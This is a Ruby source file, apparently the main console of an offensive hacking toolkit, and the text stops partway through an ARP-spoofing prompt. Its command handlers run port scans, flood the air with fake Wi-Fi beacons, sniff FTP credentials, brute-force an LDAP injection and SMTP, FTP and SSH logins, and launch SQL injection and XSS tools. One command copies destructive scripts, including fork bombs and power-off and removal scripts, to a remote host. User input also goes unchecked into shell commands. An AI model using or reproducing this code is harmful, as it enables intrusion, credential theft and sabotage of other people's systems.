require 'colorize'
require 'packetgen'
require 'socket'
require 'open-uri'
require 'readline'
require 'rubygems'
require 'timeout'
require 'net/http'
require 'whois'
require 'whois-parser'
require 'socket'
require 'net/ssh'
require 'httparty'
require 'timeout'
require 'uri'
require 'openssl'
require 'net/dns'
require 'packetfu'
require 'resolv'
# FTP module 
require './mod-ftp'
# TCP module for packet analysis
require './mod-net.rb' 
# FAP ( Fake Access Point ) module 
require './mod-fake.rb'
# Shodan module
require './shodan.rb'
# crypto 
require 'digest'

# use this in a instance of line seperation \n\n \y\y\ etc
def sep(seperation)
    puts "#{seperation}"
end

def hasher(hash_type, password)
    if hash_type == "sha2"
        main = Digest::SHA2.new(bitlen = 256).hexdigest "#{password}"
        puts "SHA2 hash => #{main}"
    end
    if hash_type == "sha1"
        puts Digest::SHA1.hexdigest "#{password}"
    end
    if hash_type == "md5"
        puts Digest::MD5.hexdigest "#{password}"
    end
end


# og code from bhr
def cae(pass, shift=1)
    lowercase, uppercase = ('a'..'z').to_a, ('A'..'Z').to_a
    lower = lowercase.zip(lowercase.rotate(shift)).to_h
    upper = uppercase.zip(uppercase.rotate(shift)).to_h  
    encrypter = lower.merge(upper)
    pass.chars.map{|c| encrypter.fetch(c, c)}
end

# open a file, save lines of code 
def open_file(color, filename)
    file = File.open(filename)
    fd = file.readlines.map(&:chomp)
    puts color, fd
    file.close
end


# to make sure that it is a simple call command for running etc files
def dir_command(filepath, command) 
    system("cd #{filepath} ; #{command}")
end

# detecting the os
def os
    if RUBY_PLATFORM =~ /win32/
        puts "                                          Detected Os ->  Windows"
        puts "                      NOTE: this system, for the most part is not support in 
                            
                                    Versions 1-5, fo not be suprised if they dont work"
    elsif RUBY_PLATFORM =~ /linux/
        puts "                                          Detected Os ->  Linux"
      elsif RUBY_PLATFORM =~ /darwin/
        puts "                                          Detected Os -> Mac OS X"
      elsif RUBY_PLATFORM =~ /freebsd/
        puts "                                          Detected Os -> FreeBSD"
      else
        puts "                                          Detected Os -> is unknown"
      end
    end






# web port scaner ruby 
def webscan
    puts 'Ex www.google.com'
    puts '-------------------'
    print"Target World Wide Web link  ~~> ".colorize(:red)
    www = gets.chomp 
    ipa = IPSocket::getaddress("#{www}")
    puts '______________________________________________'
    puts '[+] Scanning Host ~~> '.colorize(:yellow) + ipa
    puts '[+] Scanning 65,000 Ports'.colorize(:yellow)
    puts '----------------------------------------------'.colorize(:red)
    ports = 1..65389
    ports.each do |scan|
        begin
            Timeout::timeout(0.1){TCPSocket.new(ipa, scan)}
            rescue
                #puts "[PORT] #{scan} IS [CLOSED]"
            else
                dt = DateTime.now
                puts dt.next_month.strftime(" \033[36m[\033[35m%H:%M\033[36m] ") + "\033[35m[\033[36mRED-RABBIT-INF\033[35m] " + "[PORT#{scan}] CAME BACK OPEN"
            end
            #
            rescue Interrupt
                puts '[!] Exiting Scan'
                print "Would you like to go back to the menue Y/n >>> "
                get = gets.chomp
                if get == 'Y'
                    console_main
                end
                if get == 'n'
                    puts '[+] Exiting...'
                    exit!
                end
        end
    end

def hostscan()
    print"Target Address ~~> ".colorize(:red)
    ip = gets.chomp 
    ports = 1..65000
    ports.each do |scan|
        begin
            Timeout::timeout(0.1){TCPSocket.new(ip, scan)}
            rescue
                #puts "[PORT] #{scan} IS [CLOSED]"
            else
                dt = DateTime.now
                puts dt.next_month.strftime(" \033[36m[\033[35m%H:%M\033[36m] ") + "\033[35m[\033[36mRED-RABBIT-INF\033[35m] " + "[PORT#{scan}] CAME BACK OPEN"
            end
            #puts '[Finished Scan]'
        end
    end


########################################################################################################################
#
# Documentation: Module 5 chapter 2 i talk about fixing the error phy dev `too many open files` despite being in root 
# using a shell called RB-Shell, this is the start of RB-Shell, RB-Shell is an extension mock of the standard command 
# line interface/kernal by defualt in linux, this is a small terminal to help fix such script errors that revolve 
# around what would be used as a system command 
#
# something like phydev in this case 
#
# From: ArkAngeL43
#
#
# shell libs: readlines
# mind map: https://www.rubyguides.com/2016/07/writing-a-shell-in-ruby/
# 
#
#
# shell starts here and ends on line < input line here > 
#
#
#
#module Shell_commands
#    def cmexe(command)
#        system(command)
#    end
#end
#
#class Shell_Exec
 #   include Shell_commands
#    def execute()
#        cmexe(@command)
#    end
#end




############ BEGGINING OF MAKING MAIN COMMAND FUNCTIONS #################

def ip(addr)
    track = URI.open("https://ipapi.co/#{addr}/json/").read
    puts track
end


def rouge()
    iface     = 'mon0'
    broadcast = "ff:ff:ff:ff:ff:ff"
    bssid     = "aa:aa:aa:aa:aa:aa"
    print("Fake SSID Name >>> ")
    ssid      = gets.chomp
    while true
        pkt = PacketGen.gen('RadioTap').add('Dot11::Management', mac1: broadcast, mac2: bssid, mac3: bssid)
                                    .add('Dot11::Beacon', interval: 0x600, cap: 0x401)
        pkt.dot11_beacon.elements << {type: 'SSID', value: ssid}
        pp pkt
        100000.times do
        pkt.to_w(iface)
        #remote_ip = URI.open('http://whatismyip.akamai.com').read
        puts '[+] ~~> Fake Beacon '.colorize(:red) + ssid + ' USING ~~> '.colorize(:blue) + iface
        end
    end
end



def tcp_dumb(iface)
    cap = PacketFu::Capture.new(:iface=> "#{iface}", :promisc => true, :start => true)
    cap.show_live
end


def ftpsniff(ifl)
    PacketGen.capture(iface: "#{ifl}", filter: 'port ftp or ftp-data', max: 1000) do |pkt|
    puts "[ + ] Capturing....Awaiting response"
        if pkt.tcp.body.include?("USER") || pkt.tcp.body.include?("PASS")
        puts pkt.ip.src + " -> " + pkt.ip.dst 
        puts pkt.tcp.body
        end
    end
end


def captured(file)
    pkts = PacketGen.read(file)
    pkts.each do |pkt| 
    if pkt.tcp.body.include?("USER") || pkt.tcp.body.include?("PASS")
        puts pkt.ip.src + "<CONN>" + pkt.ip.dst 
        puts pkt.tcp.body
    end
    end
end


# break from wire 
def LDAP_i(server_URL)
    flags = ''
    blind_chars= [*'a'..'z', *'A'..'Z', *'0'..'9'] + '_@{}-/()!"$%=^[]:;'.split('')
    (0..50).each do |i|
        puts "\n\n\n"
        puts "\033[37m[INFO] DATA: Looking for number #{i}"
        blind_chars.each do |char|
            # must have ?
            request = Net::HTTP.get(URI("#{server_URL}action=dir&search=admin*)(password=#{flags}#{char}"))
            if /TRUE CONDITION/.match?(request)
                flags += char
                puts("[+] FLAG -> #{flags}")
                break
            end
        end 
    end
end

def rouge()
    iface     = 'wlan0mon'
    broadcast = "ff:ff:ff:ff:ff:ff"
    bssid     = "aa:aa:aa:aa:aa:aa"
    print("Fake SSID Name >>> ")
    ssid      = gets.chomp
    while true
        pkt = PacketGen.gen('RadioTap').add('Dot11::Management', mac1: broadcast, mac2: bssid, mac3: bssid).add('Dot11::Beacon', interval: 0x600, cap: 0x401)
        pkt.dot11_beacon.elements << {type: 'SSID', value: ssid}
        pp pkt
        100000.times do 
        pkt.to_w(iface)
        puts "Beacons being broadcasted ~> #{ssid} " 
        end
    end
end



def snmp_en(hostname)
    req = SNMP::Manager.new(:host => "#{hostname}")
    host = req.get("sysName.0").each_varbind.map {|ho| ho.value.to_s}
    host_con = req.get("sysContact.0").each_varbind.map {|ho| ho.value.to_s}
    host_loc = req.get("sysLocaltion.0").each_varbind.map {|ho| ho.value.to_s}
    #
    puts "SNMP Community|-< " + req.config[:community]
    puts "SNMP Version  |-< " + req.config[:version]
    puts "SNMP Write Com|-< " + req.config[:WriteCommunity]
    response_main_get = req.get(["sysLocation.0", "sysName.0", "sysContact.0"])
    response_main_get.each_varbind do |ho|
        puts ho.value.to_s
    end
end



def dg(domain)
    whois = Whois::Client.new
    whois.lookup("#{domain}")
    record = Whois.whois("#{domain}")
    parser = record.parser
    register = parser.registered?
    created = parser.created_on 
    main = parser.technical_contacts.first
    resolver = Net::DNS::Resolver.start("#{domain}")
    resol2 = Net::DNS::Resolver.start("#{domain}").answer
    resol3 = Net::DNS::Resolver.start("#{domain}", Net::DNS::MX).answer
    sep("\n\n")
    puts resolver
    sep("\n\n")
    puts resol2
    sep("\n\n")
    puts resol3
    parser.nameservers.each do |nameserver|
        puts "\033[34m[+] -> "+ "#{nameserver}"
    end
end

def basic_grabber(url)
    puts "\n\n\033[32m"
    uri = URI.parse("#{url}")
    http = Net::HTTP.new(uri.host, uri.port)
    userag     = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.54 Safari/537.36"
    uri  = URI.parse("#{url}")
    http = Net::HTTP.new(uri.host, uri.port)
    http.use_ssl        = true if uri.scheme == 'https'
    http.verify_mode    = OpenSSL::SSL::VERIFY_NONE
    date = Time.new 
    req  = Net::HTTP::Get.new(uri.request_uri)
    pp req.to_hash
    req["User-Agent"] = "#{userag}"
    res   = http.request(req)
    resur = Net::HTTP.get_response(URI.parse(url.to_s))
    res.code
    res.message 
    res.code_type
    res.content_type
    pp res.to_hash
end

def server_names(domain, url)
    whois = Whois::Client.new
    whois.lookup("#{domain}")
    record = Whois.whois("#{domain}")
    parser = record.parser
    register = parser.registered?
    created = parser.created_on 
    main = parser.technical_contacts.first
    resolver = Net::DNS::Resolver.start("#{domain}")
    resol2 = Net::DNS::Resolver.start("#{domain}").answer
    resol3 = Net::DNS::Resolver.start("#{domain}", Net::DNS::MX).answer
    sep("\n\n")
    puts resolver
    sep("\n\n")
    puts resol2
    sep("\n\n")
    puts resol3
    parser.nameservers.each do |nameserver|
        puts "\033[34m[+] -> "+ "#{nameserver}"
    end
    uri = URI.parse("#{url}")
    n = `host #{domain}`.match(/(\d{1,3}\.){3}\d{1,3}/).to_s
    http = Net::HTTP.new(uri.host, uri.port)
    userag     = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.54 Safari/537.36"
    uri  = URI.parse("#{url}")
    http = Net::HTTP.new(uri.host, uri.port)
    http.use_ssl        = true if uri.scheme == 'https'
    http.verify_mode    = OpenSSL::SSL::VERIFY_NONE
    date = Time.new 
    req  = Net::HTTP::Get.new(uri.request_uri)
    pp req.to_hash
    req["User-Agent"] = "#{userag}"
    res   = http.request(req)
    resur = Net::HTTP.get_response(URI.parse(url.to_s))
    res.code
    res.message 
    res.code_type
    res.content_type
    pp res.to_hash
    puts '-------------------------'
    puts '[*] Response ~> '  + resur.code 
    sleep 0.1
    puts '[*] Checking More Connections..'
    puts '--------------------------'
    a = HTTParty.get(url).headers
    ip = IPAddr.new(n)
    map = ip.ipv4_compat.to_string
    puts '[*] Query          => '  , uri.query  
    puts '[*] Scheme         => '  , uri.scheme
    puts '[*] Port  Main     => '  , uri.port
    puts '[*] HOSTNAME       => '  , uri.host
    puts '[*] Path           => '  , uri.path
    puts '[*] Request URI    => '  , uri.request_uri 
    puts '[*] Server         => '  +  a["server"] 
    puts '[*] Date           => '  +  a["date"] 
    puts '[*] Content        => '  +  a["content-type"] 
    puts '[*] Response Code  => '  + resur.code
    puts '[*] Last-mod       => '  
    puts a["last-modified"]
    puts '[*] trans-enc      => '  
    puts a["transfer-encoding"]
    puts '[*] Connection     => '  + a["connection"]
    puts '[*] Access-control => '  
    puts a["access-control-allow-origin"]
    puts '[*] Cache-control  => '  
    puts resur.response["Cache-Control"]
    puts '-----------------------SERVER INF--------------------'  
    puts '[*] Calculated IPV6 | '  + map                 
    puts '[*] Server IP       | '  + n 
    puts '[*] X-Frame-OP      | '  
    puts resur.response["x-frame-options"]
    puts '[*] X-XSS-Protect   | '  
    puts  resur.response["x-xss-protection"]
    puts '[*] X-Content-type  | '  
    puts resur.response["x-content-type-options"]
    puts '[*] Max-Age         |'  
    puts resur.response["max-age"]
    puts '[*] X-Request-ID    |' 
    puts resur.response["x-request-id"]
    puts '[*] X-Runtime       |' 
    puts resur.response["x-runtime"]
    puts '[*] Access Control  |' 
    puts resur.response["access_control_max_age"]
    puts '[*] Access Allow    |' 
    puts resur.response["access_control_allow_methods"]
    puts '[*] Content Length  |' 
    puts resur.response["content-length"]
    puts '[*] Connection      |' 
    puts resur.response["connection"]
    puts '[*] Content_Dispo   |' 
    puts resur.response["content_disposition"]
    puts '[*] Expires         |' 
    puts resur.response["expires"]
    puts '[*] set-cookie      |' 
    puts resur.response["set-cookie"]
    puts '[*] user-Agent      |' 
    puts resur.response["user-agent"]
    puts '[*] bfcache-opt-in  |' 
    puts resur.response["bfcache-opt-in"]
    puts '[*] Content encode  | ' 
    puts resur.response["content-encoding"]
    puts '[*] content-sec     | ' 
    puts resur.response["content-security-policy"]
    puts '[*] Session Cookie  |' 
    puts resur.response["set-cookie"]
    puts '[*] strict-trans    |' 
    puts resur.response["strict-transport-security"]
    puts '[*] method          |' 
    puts resur.response["method"]
end

def hd(fd)
    file_name = fd
    file = File.open(file_name , 'rb')
    file2hex = file.read.each_byte.map { |b| '\x%02x' % b }.join    # b.to_s(16).rjust(2, '0')
    sep("\n\n\n")
    puts "---------------------------------------------------- HEXIDECIMAL DUMP ---------------------------------------"
    puts "\033[32m", file2hex
    puts "---------------------------------------------------- BINARY DUMP ---------------------------------------"
    dir_command("modules/file", "go run hex.go -f #{fd} -b 256")
end

# sos start or stop interface
def active_seactiv_interface(sos, interface)
    system("sudo airmon-ng #{sos} #{interface}") 
    puts "[ + ] Interface #{sos}"
end

def move(filepath, destination)
    require 'fileutils'
    my_dir = Dir["#{filepath}/*.txt"]
    my_dir.each do |filename|
    name = File.basename('filename', '.doc')[0,4]
    dest_folder = "#{destination}"
    FileUtils.cp(filename, dest_folder)
    end
end


# ftp sniffing V2 
def n(backslash)
    puts backslash
end

def main_tcp(tcp_port)
    rev       = "\033[0;39m"
    reb       = "\033[49m"
    blk       = "\033[0;30m"
	red       = "\033[0;31m"
	grn       = "\033[0;32m"
	yel       = "\033[0;33m"
	blu       = "\033[0;34m"
	mag       = "\033[0;35m"
	cyn       = "\033[0;36m"
	wht       = "\033[0;37m"
    blkb      = "\033[40m"
	redb      = "\033[41m"
	grnb      = "\033[42m"
	yelb      = "\033[43m"
	blub      = "\033[44m"
	magb      = "\033[45m"
	cynb      = "\033[46m"
	whtb      = "\033[47m"
    stats = TCPdump.new
    # packetfu connection and configuration
    iface = PacketFu::Utils.default_int
    my_ip = PacketFu::Utils.ifconfig(iface)[:ip_saddr]
    tcp_start_config = PacketFu::Capture.new(:iface => iface)
    tcp_start_config.bpf(:iface=> iface, :promisc => true, :filter => "ip and tcp port #{tcp_port}")
    #
    # start the dump
    tcp_start_config.start
    # for each packet format the data
    pack = 0
    tcp_start_config.stream.each do | packet |
        n("\n\n")
        pack += 1
        info = PacketFu::Packet.parse(packet)
        stats.process_connection(:source => info.ip_saddr, :destination => info.ip_daddr)
        puts stats.stats
        t = Time.now
        puts(wht, "[" + redb + t.strftime("%I:%M %p") + wht + "]" + wht + "[" + blub + " INFO " + wht + reb + "]"  + grn + " Packets captured => " + pack.to_s)
        puts(wht, "[" + redb + t.strftime("%I:%M %p") + wht + "]" + wht + "[" + blub + " INFO " + wht + reb + "]"  + blu, :source => info.ip_saddr.to_s )
    end
end

# return the color once output is done 
# control color tags
def returncolor(color)
    puts "#{color}"
end


def module_checker(modulename)
    require "#{modulename}"
rescue LoadError
    puts "ERROR: FATAL: => MODULE #{modulename} failed to load"
else
    if modulename == "./mod-ftp.rb"
       puts "\t\t\t\t\033[31m      FTP Module      \033[32m[OK\033[31m...\033[32m]"
    end
    if modulename == "./mod-net.rb"
       puts "\t\t\t\t\033[31m      NET Module      \033[32m[OK\033[31m...\033[32m]"
    end
    if modulename == "./mod-fake.rb"
        puts "\t\t\t\t\033[31m      Fake AP Module  \033[32m[OK\033[31m...\033[32m]"
    end
    if modulename == "./shodan.rb"
        puts "\t\t\t\t\033[31m      Shodan Module   \033[32m[OK\033[31m...\033[32m]"
    end
end




# developer notes 
#
##
# this was a kinda shitty way to do this but i couldnt think of a way to actually do this 
# when v5.5 cvomes out i will create a module to intake commands and match them with the 
# output, something to actually give it a bit more handeling given IF statements constantly 
# in the same row in this ammount is highly heavy on your CPU and really just shouldnt be used 
#
# when i advance more into modules and class sets ill probobly end up converting everything to a 
# class and call the class to specify a command
#
def console_commands(commands)
    # if if if if if if if if if if if XDDDDDDDDDDDd got i cant wait to change this
    begin   
        rev       = "\033[0;39m"
        reb       = "\033[49m"
        blk       = "\033[0;30m"
        red       = "\033[0;31m"
        grn       = "\033[0;32m"
        yel       = "\033[0;33m"
        blu       = "\033[0;34m"
        mag       = "\033[0;35m"
        cyn       = "\033[0;36m"
        wht       = "\033[0;37m"
        blkb      = "\033[40m"
        redb      = "\033[41m"
        grnb      = "\033[42m"
        yelb      = "\033[43m"
        blub      = "\033[44m"
        magb      = "\033[45m"
        cynb      = "\033[46m"
        whtb      = "\033[47m"
        if commands == "ip-t-h"
            print "ip > "
            ip = gets.chomp
            dir_command("modules/perl/modules", "perl ip-to-hex.pl #{ip}")
            console_main()
        end
        if commands == "web_view"
            dir_command("modules/my-websitr", "go run main.go")
        end
        if commands == "LDAP-i"
            puts "EX: http://example.web?"
            print "Enter a LDAP server URL > "
            url = gets.chomp
            LDAP_i("#{url}")
            console_main()
        end
        if commands == "sha1"
            print "Enter a string > "
            str = gets.chomp
            hasher("sha1", "#{str}")
            console_main()
        end
        if commands == "sha2"
            print "Enter a string > "
            str = gets.chomp
            hasher("sha2", "#{str}")
            console_main()
        end
        if commands == "ceaser"
            print "enter a password/str > "
            str = gets.chomp
            1.upto(30) do |rate|
                puts "ROT #{rate}" + cae("#{str}", rate).join
            end
            console_main()
        end 
        if commands == "snmp1"
            print "HOST IP > "
            ipa = gets.chomp
            snmp_en("#{ipa}")
            console_main()
        end
        if commands == "kick_MSQL"
            print "Enter a Vulnerable URL > "
            url = gets.chomp
            dir_command("modules/injection", "go run tables.go --url '#{url}' ")
            console_main()
        end
        if commands == "sqlf"
            print "\n\tEnter the vulnerable URL > "
            url = gets.chomp
            print "\n\tEnter the Domain > "
            dom = gets.chomp
            print "\n\tEnter the Base HTTP URL > "
            base = gets.chomp
            sep("\n\n\n")
            puts "
                WARN: TOR is not defualt, would you like to use TOR to CRAWL?

                WARN: TOR has a high chance of failing causing a restart of the command 

                WARN: BE SURE OF YOU'RE OPTION!!!!!
            "
            sep("\n")
            print "Activate TOR? Y/n > "
            yn = gets.chomp
            if yn == "Y" || yn == "y"
                system("sudo service tor start")
                dir_command("modules/injection", "go run sql-finder-forked.go -target #{url} -domain #{dom} -base #{base} -tor")
            end
            if yn == "N" || yn == "n"
                dir_command("modules/injection", "go run sql-finder-forked.go -target #{url} -domain #{dom} -base #{base}")
            end
            console_main()
        end
        if commands == "sqlf=F"
            print "Enter the path to list of injections you want to use > "
            list = gets.chomp
            print "\n\tEnter the Vulnerable URL > "
            url = gets.chomp
            print "\n\tEnter the domain name    > "
            domain = gets.chomp
            print "\n\tEnter the base HTTP URL  > "
            base = gets.chomp
            #
            #
            # main
            sep("\n\n\n")
            puts "
                WARN: TOR is not defualt, would you like to use TOR to CRAWL?

                WARN: TOR has a high chance of failing causing a restart of the command 

                WARN: BE SURE OF YOU'RE OPTION!!!!!
            "
            sep("\n")
            print "Activate TOR? Y/n > "
            yn = gets.chomp
            if yn == "Y" || yn == "y"
                system("sudo service tor start")
                dir_command("modules/injection", "go run sql-finder-forked.go -target #{url} -domain #{domain} -base #{base} -tor -file #{list}")
            end
            if yn == "N" || yn == "n"
                dir_command("modules/injection", "go run sql-finder-forked.go -target #{url} -domain #{domain} -base #{base} -file #{list}")
            end
            console_main()
        end
        if commands == "PNT-U"
            print "US Phone Number > "
            ph = gets.chomp.to_s
            dir_command("modules/osint", "chmod +x ./phone-us.sh ; ./phone-us.sh --num #{ph}")
            console_main()
        end
        if commands == "d-o" 
            print "Domain > "
            dom = gets.chomp.to_s
            print "URL > "
            url2 = gets.chomp.to_s
            server_names(dom, url2)
            basic_grabber("#{url2}")
            dg("#{dom}")
            console_main()
        end
        if commands == "EXIF"
            print "\n\t Enter the path to the image > "
            image = gets.chomp
            dir_command("modules/perl/modules/EXIF", "perl EXIF.pl -f #{image}")
        end
        if commands == "QR=nolist" 
            print "\n\t Enter a URL to imbed > "
            uri1 = gets.chomp
            dir_command("modules/perl/modules/QR-GEN", "perl main -o main.png #{uri1}")
            puts "\n\n Dir of QR code is modules/perl/modules/QR-GEN/main.png"
            console_main()
        end
        if commands == "QR=list" 
            print "\n\t Enter a filepath of a list of URLS > "
            lists = gets.chomp
            dir_command("modules/perl/modules/QR-GEN", "perl main -f #{lists}")
            console_main()
        end
        if commands == "ARP" 
            dir_command("modules/wifi", "sudo go run arp.go -arp")
        end
        if commands == "doc-dem" 
            puts " Activating server "
            dir_command("credits-about", "go run main.go")
        end
        if commands == "ip-t" 
            print "IPA > "
            ipa = gets.chomp.to_s
            ip("#{ipa}")
            console_main()
        end
        if commands == "robo-get" 
            puts "Input the url"
            puts '-------------'
            print "> "
            uri = gets.chomp
            dir_command("modules/web_etc", "go run download-ro.go -url #{uri}")
            console_main()
        end
        if commands == "dm-b"
            puts "If you are having trouble understanding please
                refer to the documentation, module 7 chapter 1 
                for further instructions"
            puts "_____________________________________________"
            print "Please enter the path of the config file > "
            sep("\n\n")
            print "Filepath > "
            fp = gets.chomp
            dir_command("modules/dns-blockers", "go run block-dns-loop.go -config #{fp}")
                end
        if commands == "W-SSID" 
            dir_command("modules/wifi", "python3 sniffer-ssid.py")
            console_main()
        end
        if commands == "G-BSSID" 
            dir_command("modules/wifi", "go run bssid.go")
            console_main()
        end
        if commands == "SMTP-b" 
            puts "
            List of services 
            ___________
            [ gmail   ] = smtp.gmail.com
            [ hotmail ] = smtp.live.com
            [ yahoo   ] = smtp.mail.yahoo.com 
            |)))))))))|
            "
            print "\nService  > "
            service = gets.chomp.to_s
            print "\nEmail    > "
            email = gets.chomp
            print "\nWordlist > "
            wordlist = gets.chomp.to_s
            dir_command("modules/brute-forcing", "go run smtp.go -email #{email} -list #{wordlist} -service #{service}")
            console_main()
        end
        if commands == "HTML-r" 
            t = Time.now
            defmodule = "modules/url-parser"
            print "URL > "
            uo = gets.chomp.to_s
            dir_command("modules/url-parser", "go run html.go -targ #{uo}")
            puts(wht, "[" + redb + t.strftime("%I:%M %p") + wht + "]" + wht + "[" + blub + " INFO " + wht + reb + "]"  + grn + " File location => " + defmodule)
            console_main()
        end
        if commands == "URL-r"
            puts "\n\n"
            puts "\033[32mExample > https://github.com/ArkAngeL43/Go-Diver/blob/main/crawl.go#L4"
            print "\n\033[34mComplex URL > "
            complex_url = gets.chomp.to_s
            dir_command("modules/url-parser", "go run url.go -url #{complex_url}")
            console_main()
        end
        if commands == "F-dns" 
            print "\nDNS > \033[35m"
            dns = gets.chomp
            dg("#{dns}")
            console_main()
        end
        if commands == "dom-g"
            print "\nURL > "
            dom = gets.chomp
            basic_grabber("#{dom}")
            console_main()
        end
        if commands == "d-g" 
            print "\nHost to scan > "
            h = gets.chomp
            dir_command("modules/port-scanning", "go run scanner.go -pscanh -host #{h}")
            console_main()
        end
        if commands == "port-g-l"
            print "\nPath to list > "
            path = gets.chomp
            dir_command("modules/port-scanning", "go run scanner.go -portl -list #{path}")
            console_main()
        end
        if commands == "port-r"
            webscan()
            console_main()
        end
        if commands == "port-r-h" 
            hostscan()
            console_main()
        end
        if commands == "port-lg" 
            dir_command("modules/wifi", "go run arp.go -portl -list lace_ip.txt")
            console_main
        end
        if commands == "ARP"
            dir_command("modules/wifi", "go run arp.go -arp")
        end
        if commands == "SSH-i"
            print "\nSSH User > "
            host = gets.chomp
            print "SSH IP > "
            hip = gets.chomp
            system("sudo service ssh start ; scp modules/sshv/damage-net.sh #{USER}@#{HOST}")
            system("scp modules/sshv/poweroff.sh #{USER}@#{HOST}")
            system("scp modules/sshv/restart.sh #{USER}@#{HOST}")
            system("scp modules/sshv/remove.sh #{USER}@#{HOST}")
            system("scp modules/sshv/win-1.bat #{USER}@#{HOST}")
            system("scp modules/sshv/win-2.bat #{USER}@#{HOST}")
            system("scp modules/sshv/fork.sh #{USER}@#{HOST}")
            system("scp modules/sshv/fork.bat #{USER}@#{HOST}")
            puts "[ + ] DATA: QUESTION: FILE SENT TO HOST?"
            console_main()
        end
        if commands == "FTP-b"
            print "\nFTP User > "
            user = gets.chomp.to_s
            print "\nFTP Port > "
            po = gets.chomp.to_s
            print "\nFTP IPA  > "
            ipa = gets.chomp.to_s
            print "\nWordlist > "
            wordlist = gets.chomp.to_s
            puts "\n
                \033[32mINFO: DATA: FTP User => #{user}
                INFO: DATA: FTP Port => #{po}
                INFO: DATA: FTP IPA  => #{ipa}
                INFO: DATA: Wordlist => #{wordlist}
            "
            File.open("#{wordlist}").each do |line|
                ftp = Net::FTP.new
                ftp.connect(ipa, po)
                puts "\t\033[37m[\033[34m INFO \033[37m] Trying password #{line} With user #{user}"
                ftp.login(user, line)
            rescue Errno::ECONNREFUSED
                puts "\033[31mERROR: FATAL: WARN: TO EXIT PLEASE PRESS CTRL+C"
                puts "\033[31mERROR: CONNECTION REFUSED ATTEMPTED ON -> #{ipa} - PORT -> #{po} WITH USER -> #{user} ON PASSWORD #{line}" 
            end
        end
        if commands == "start-i"
            print " Interface > "
            inter = gets.chomp
            active_seactiv_interface("start", "#{inter}")
            console_main()
        end
        if commands == "stop-i"
            print "Interface > "
            inter = gets.chomp
            active_seactiv_interface("stop", "#{inter}")
            console_main()
        end
        if commands == "si-phy"
            system("iw phy phy1 interface add mon0 type monitor && ifconfig mon0 up")
            console_main()
        end
        if commands == "s-phys"
            print "Interface > "
            im = gets.chomp
            system("ifconfig down #{im}")
            console_main()
        end
        if commands == "SSH-B-R"
            print "\nHost user   > "
            user = gets.chomp
            print "\nFilepath to wordlist > "
            wordlist = gets.chomp
            print "\nPort        > "
            port = gets.chomp
            print "\nIPA         > "
            ipa = gets.chomp
            print"\x1b[H\x1b[2J\x1b[3J"
            open_file("\033[35m", "txt/banner.txt")
            dir_command("modules/brute-forcing", "ruby ssh2.rb -host #{ipa} -user #{user} -port #{port} -filename #{wordlist}")
        end
        if commands == "SSH-B-G"
            print "\nHost user  > "
            us = gets.chomp
            sep("\n")
            puts "** WARN: DO NOT PUT TXT AT END OF FILEPATH PLEASE USE
                    EXAMPLE: /usr/share/wordlists  
                    FILE COPY METHOD COPYS ALL TXT FILES IN DIR AND USES THEM
            "
            print "\nFilepath to wordlist   > " # FILE ERROR => ﻿ special char randomly popped up
            print "\nPort       > "
            po = gets.chomp
            print "\n"
            puts " EX: dnsmap.txt"
            print "Wordlist name with .txt to use > "
            mwo = gets.chomp
            print"\x1b[H\x1b[2J\x1b[3J"
            open_file("\033[31m", "txt/banner.txt")
            move("#{word}", "modules/brute-forcing")
            dir_command("modules/brute-forcing", "go run ssh.go -user #{us} -file #{mwo} -ip #{ip} -port #{po}")
            console_main()
        end
        if commands == "tcp-d"
            print "Port to listen on > "
            tpo = gets.chomp
            main_tcp("#{tpo}")
        end
        if commands == "ftp-C"
            print "\033[34m\nInterface > "
            iface = gets.chomp
            ftpsniff("#{iface}")
            console_main()
        end
        if commands == "ftp-read"
            print "PCAPNG File > "
            fil = gets.chomp
            captured("#{fil}")
            console_main()
        end
        if commands == "fake-ap"
            print "\n\tInterface > "
            interface = gets.chomp
            print "\n\t\n\tFake SSID name > "
            ssid = gets.chomp
            print "\n\tWould you like to get a packet view? Y/N > "
            packetview = gets.chomp
            if packetview == "Y"
                system("sudo ruby fake_ap.rb -interface #{interface} -ssidname #{ssid} -pkt_tf true")
            end
            if packetview == "N"
                system("sudo ruby fake_ap.rb -interface #{interface} -ssidname #{ssid} -pkt_tf false")
            end
        end
        if commands == "commands-stat=false"
            open_file("", "txt/commands-no-stat.txt")
            sep("\n\n")
            console_main()
        end
        if commands == "help" || commands == "h"
            open_file("", "txt/commands.txt")
            sep("\n\n")
            console_main()
        end
        if commands == "commands-stat=true"
            open_file("", "txt/commands.txt")
            sep("\n\n")
            console_main()
        end
        if commands == "HELP"
            open_file("", "txt/commands.txt")
            sep("\n\n")
            console_main()
        end
        if commands == "COMMANDS"
            open_file("", "txt/commands.txt")
            sep("\n\n")
            console_main()
        end
        if commands == "-h"
            open_file("", "txt/commands.txt")
            sep("\n\n")
            console_main()
        end
        if commands == "art"
            open_file("", "txt/banner.txt")
            sep("\n\n")
            console_main()
        end
        if commands == "clear" or commands == "cls"
            print"\x1b[H\x1b[2J\x1b[3J"
            open_file("\033[31m", "txt/banner.txt")
            console_main()
        end
        if commands == "ajax-wo"
            print "HTTPS-URL > "
            httpsurl = gets.chomp
            print "DOMAIN > "
            domain = gets.chomp
            print "BASE-HTTP > "
            base = gets.chomp 
            dir_command("modules/ajax-crawlers", "go run ajax-wo.go -target #{httpsurl} -domain #{domain} -base #{base}")
            console_main()
        end
        if commands == "ajax-NK"
            print "HTTPS-URL > "
            httpsurl = gets.chomp
            print "DOMAIN > "
            domain = gets.chomp
            print "BASE-HTTP > "
            base = gets.chomp 
            dir_command("modules/ajax-crawlers", "go run nuke-ajax.go -target #{httpsurl} -domain #{domain} -base #{base}")
            console_main()
        end
        if commands == "whois"
            print "Domain name > "
            domaina = gets.chomp
            print "URL > "
            url = gets.chomp
            server_names("#{domaina}", "#{url}")
            console_main()
        end  
        if commands == "hd"
            print "File path > "
            fp = gets.chomp
            hd("#{fp}")
            console_main()
        end
        if commands == "xss-t"
            print "URL > "
            ul = gets.chomp
            print "XSS list > "
            fl = gets.chomp
            dir_command("modules/injection", "python3 xss.py #{ul} #{fl} ")
            console_main()
        end
        if commands == "sql-t"
            print "URl > "
            ul = gets.chomp
            dir_command("modules/injection", "go run sql.go -t #{ul} -l payloads/SQLI.txt")
            console_main()
        end
        if commands == "ARP-DNS" 
            print "\n\n Target IP to spoof => "
            ipspoof = gets.chomp
            print "\t Target MAC ADDR => "
            tmac = gets.chomp 
            print "\t Interface => "
            interface = gets.chomp
